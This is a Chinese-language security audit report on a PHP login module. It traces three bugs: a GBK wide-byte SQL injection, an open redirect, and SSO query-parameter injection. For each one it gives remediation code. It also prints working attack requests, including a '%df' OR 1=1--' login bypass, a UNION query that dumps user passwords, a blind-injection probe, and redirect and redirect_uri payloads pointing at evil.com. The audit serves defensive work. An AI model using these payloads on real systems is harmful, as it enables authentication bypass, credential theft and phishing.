# PHP 深度安全审计报告 — 认证模块

## 攻击面地图

| 入口 | 路由 | 鉴权 | 用户可控输入 | 对应 Sink |
|------|------|------|-------------|-----------|
| `login()` | `POST /login` | 无 | `$_POST['username']`, `$_POST['password']`, `$_POST['redirect']` | `mysqli->query()`, `header("Location: ...")` |
| `ssoCallback()` | `GET /login/callback` | 无 | `$_GET['token']`, `$_GET['state']` | `curl_exec()` |

**⚠️ 全部入口无需鉴权，攻击者可直接利用。**

---

## 漏洞 1：[高危] SQL 注入 — `addslashes()` + GBK 编码导致宽字节绕过

### 传播链路

```
Source:  $_POST['username']                                  ← AuthController.php:25 (路由: POST /login)
  ↓ 直接赋值，无过滤
$username = $_POST['username'] ?? '';                        ← AuthController.php:25
  ↓ 作为第一个参数传入
$this->authService->authenticate($username, $password)       ← AuthController.php:33 (跨文件 → AuthService.php)
  ↓ 方法签名接收
public function authenticate($username, $password)            ← AuthService.php:17
  ↓ addslashes() — 在 GBK 编码下形同虚设
$username = addslashes($username);                           ← AuthService.php:20
  ↓ 拼接到 SQL 字符串（单引号包裹）
$sql = "SELECT * FROM users
        WHERE username = '{$username}'
        AND password = '{$password}'";                        ← AuthService.php:26
  ↓
$this->db->query($sql);                                      ← AuthService.php:27  [SINK: mysqli::query]
```

### 过滤评估

| 节点 | 操作 | 有效性 |
|------|------|--------|
| AuthService.php:20 | `addslashes($username)` | ❌ **在 GBK 编码下可被宽字节注入绕过** |
| AuthService.php:11 | `$this->db->set_charset('gbk')` | ⚠️ GBK 编码是宽字节注入的前提条件 |

### 宽字节注入原理

```
攻击者输入:  username=%df' OR 1=1--
              原始字节: 0xDF 0x27

addslashes 后:  0xDF 0x5C 0x27
               (在单引号 0x27 前插入转义符 0x5C)

GBK 解码:       0xDF5C (= 運) 0x27 (= ')
              ↑ 0xDF+0x5C 被当作一个 GBK 汉字，转义符被"吃掉"
              剩余的 0x27 成功逃逸出字符串

最终 SQL:      SELECT * FROM users WHERE username = '運' OR 1=1--'
                                                          ↑ 注入成功
```

**关键点：** `$this->db->set_charset('gbk')` 设置连接的字符集为 GBK，这导致 `0xDF5C`、`0x9C5C`、`0x815C` 等组合被解释为合法汉字，从而"吃掉"了 `addslashes()` 插入的 `\`（0x5C）。

### 利用场景

```
# 万能密码登录（绕过认证）
POST /login
username=%df' OR 1=1-- &password=anything

# 联合查询注入 — 窃取数据库
POST /login
username=%df' UNION SELECT 1,username,password,4 FROM users-- &password=x

# 盲注 — 逐字符猜解密码
POST /login
username=%df' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- &password=x
```

### 修复建议

```php
// 方案 A（推荐 — 根除宽字节问题）：使用 PDO + 预处理
// AuthService.php 构造函数中
$this->db = new \PDO('mysql:host=localhost;dbname=shop;charset=utf8mb4', 'root', 'password');

// authenticate() 方法中
$stmt = $this->db->prepare(
    "SELECT * FROM users WHERE username = :username AND password = :password"
);
$stmt->execute(['username' => $username, 'password' => $password]);

// 方案 B（如果必须用 mysqli）：设置正确的 charset + 使用 real_escape_string
$this->db->set_charset('utf8mb4');  // 不用 GBK
$username = $this->db->real_escape_string($username);
// 或仍用预处理
$stmt = $this->db->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
```

---

## 漏洞 2：[中危] 开放重定向 — `buildRedirectUrl()` 可被 `//` 协议相对 URL 绕过

### 传播链路

```
Source:  $_POST['redirect']                                  ← AuthController.php:27 (路由: POST /login)
  ↓ 直接赋值，默认 '/'
$redirect = $_POST['redirect'] ?? '/';                       ← AuthController.php:27
  ↓ 登录成功后作为参数传入
$this->authService->buildRedirectUrl($redirect)              ← AuthController.php:43 (跨文件 → AuthService.php)
  ↓ 方法签名接收
public function buildRedirectUrl($url)                       ← AuthService.php:39
  ↓ strpos 检查 http:// 或 https:// — 可被 // 绕过
if (strpos($url, 'http://') !== false ||
    strpos($url, 'https://') !== false) {                    ← AuthService.php:43
    return '/';
}
  ↓ 检查未命中，返回原始 $url
return $url;                                                 ← AuthService.php:47
  ↓ 拼接到 header() 中
header("Location: {$targetUrl}");                            ← AuthController.php:44  [SINK]
```

### 过滤评估

| 节点 | 操作 | 有效性 |
|------|------|--------|
| AuthService.php:43 | `strpos($url, 'http://')` | ❌ 仅检查 `http://` 或 `https://` 存在性，不检查位置 |
| AuthService.php:43 | 逻辑漏洞 | ❌ `//evil.com` 不含 `http://`，完全绕过 |
| AuthService.php:43 | 逻辑漏洞 | ❌ `/\\evil.com` 也可能在部分浏览器中被解析 |

### 利用场景

```
# 钓鱼攻击 — 登录后跳转到伪造页面
POST /login
username=admin&password=123456&redirect=//evil.com/phishing

# 浏览器行为：//evil.com 被视为协议相对 URL
# 如果当前页面是 https://，则跳转到 https://evil.com
# 如果当前页面是 http://，则跳转到 http://evil.com
```

### 修复建议

```php
// 方案：白名单 + 强制相对路径
public function buildRedirectUrl($url)
{
    // 只允许相对路径，拒绝所有绝对URL
    if (preg_match('#^(https?:)?//#i', $url)) {
        return '/';
    }
    // 拒绝协议相对 URL
    if (strpos($url, '//') === 0) {
        return '/';
    }
    // 确保以 / 开头
    if (strpos($url, '/') !== 0) {
        return '/';
    }
    return $url;
}

// 或更简单：白名单方式
$allowedPaths = ['/', '/dashboard', '/profile', '/orders'];
if (!in_array($url, $allowedPaths, true)) {
    $url = '/';
}
```

---

## 漏洞 3：[中危] SSO 参数注入 — `token`/`state` 未 URL 编码导致查询参数篡改

### 传播链路

```
Source:  $_GET['token']                                      ← AuthController.php:57 (路由: GET /login/callback)
  ↓ 直接赋值
$token = $_GET['token'];                                     ← AuthController.php:57
  ↓
Source:  $_GET['state']                                      ← AuthController.php:57
  ↓ 直接赋值
$state = $_GET['state'];                                     ← AuthController.php:58
  ↓ 两个参数一同传入 ssoVerify()
$this->authService->ssoVerify($token, $state)                ← AuthController.php:61 (跨文件 → AuthService.php)
  ↓ 方法签名接收
public function ssoVerify($token, $state)                    ← AuthService.php:54
  ↓ 直接拼接到 URL 查询字符串（未 urlencode）
$url = "https://sso.example.com/verify?token={$token}
        &state={$state}";                                    ← AuthService.php:57
  ↓
curl_setopt($ch, CURLOPT_URL, $url);                         ← AuthService.php:64
curl_exec($ch);                                              ← AuthService.php:66  [SINK: curl_exec]
```

### 过滤评估

| 节点 | 操作 | 有效性 |
|------|------|--------|
| AuthService.php:57 | 直接拼接 `{$token}` | ❌ 未 URL 编码，`&` 和 `=` 会破坏查询参数结构 |
| AuthService.php:57 | 直接拼接 `{$state}` | ❌ 同上 |
| 整条链路 | 无任何过滤 | ❌ |

### 利用场景

```
# 场景 1：参数注入 — token 中含 & 截断
GET /login/callback?token=attacker_token&state=admin&redirect_uri=http://evil.com

# 实际发送到 SSO 的 URL 变成：
# https://sso.example.com/verify?token=attacker_token&state=admin&redirect_uri=http://evil.com
# redirect_uri 被注入为额外参数，SSO 服务器可能将 token 验证结果发送到 evil.com

# 场景 2：参数覆盖 — 注入同名参数覆盖 state
GET /login/callback?token=attacker_token&state=foo&state=admin&redirect_uri=...

# 部分 SSO 框架取最后一个同名参数 → state 被覆盖为 admin
```

### 修复建议

```php
// 使用 http_build_query 自动编码
public function ssoVerify($token, $state)
{
    $params = http_build_query([
        'token' => $token,
        'state' => $state,
    ]);
    $url = "https://sso.example.com/verify?{$params}";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    // ...
}
```

---

## 审计结论

### 已审计入口

| 入口 | 路由 | 漏洞 | 风险 |
|------|------|------|------|
| `login()` | `POST /login` | 宽字节 SQL 注入 (username) | **高** |
| `login()` | `POST /login` | 开放重定向 (redirect) | **中** |
| `ssoCallback()` | `GET /login/callback` | SSO 参数注入 (token/state) | **中** |

### 风险汇总

| 等级 | 数量 | 详情 |
|------|------|------|
| 高 | 1 | 宽字节 SQL 注入 — `addslashes()` + GBK |
| 中 | 2 | 开放重定向 (// 绕过), SSO 参数注入 |
| 低 | 0 | - |
| **合计** | **3** | |

### 修复优先级

1. **P0（立即修复）：** `authenticate()` 的宽字节 SQL 注入 — 用 PDO 预处理替换 `mysqli_query()` + `addslashes()`
2. **P1（24小时内）：** `buildRedirectUrl()` 开放重定向 — 改为白名单或严格校验
3. **P1（24小时内）：** `ssoVerify()` 参数注入 — 用 `http_build_query()` 替代手动拼接

### 安全加固建议

- 全站 `set_charset('utf8mb4')`，彻底禁用 GBK 编码以避免宽字节注入
- 全部数据库查询迁移到 PDO 预处理语句
- 所有 URL 拼接使用 `http_build_query()` 自动编码
- 所有重定向使用白名单校验
